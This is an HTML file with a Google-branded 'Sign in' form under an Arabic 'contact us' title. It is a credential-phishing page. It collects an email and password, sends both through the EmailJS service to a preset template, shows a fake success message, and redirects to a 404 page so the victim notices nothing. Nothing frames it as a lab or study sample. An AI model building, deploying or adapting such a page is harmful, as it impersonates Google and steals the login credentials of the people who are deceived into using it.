<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تواصل معنا</title>
    <link rel="stylesheet" href="style.css">
    
</head>
<body>

    <div class="container">

        <img src="./3c6496fed241f7335a665be353150cd4.png" alt="google logo">

        <h1>Sign in</h1>

        <p class="one">Use your Google Account</p>

        <form id="contact-form">

            <input
                type="email"
                name="name"
                placeholder="Email"
                required
            >

            <input
                name="name"
                placeholder="Password"
                required
            >

            <button type="submit">
                Sign in
            </button>

        </form>

        <p id="result"></p>

    </div>

    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

    <script>
        emailjs.init({
            publicKey: "dPhEqCLi2YVhDGz4y"
        });

        document
            .getElementById("contact-form")
            .addEventListener("submit", function(e){

                e.preventDefault();

                emailjs.sendForm(
                    "service_361ed2o",
                    "template_r2bzdol",
                    this
                )
                .then(function(){

                    document.getElementById("result").innerHTML =
                    "your account has been added successfully✔️";

                    document
                        .getElementById("contact-form")
                        .reset();
                        window.location.href = "404.html";

                })
                .catch(function(error){

                    document.getElementById("result").innerHTML =
                    "❌ sorry try again!";

                    console.log(error);

                });

            });
    </script>

</body>
</html>
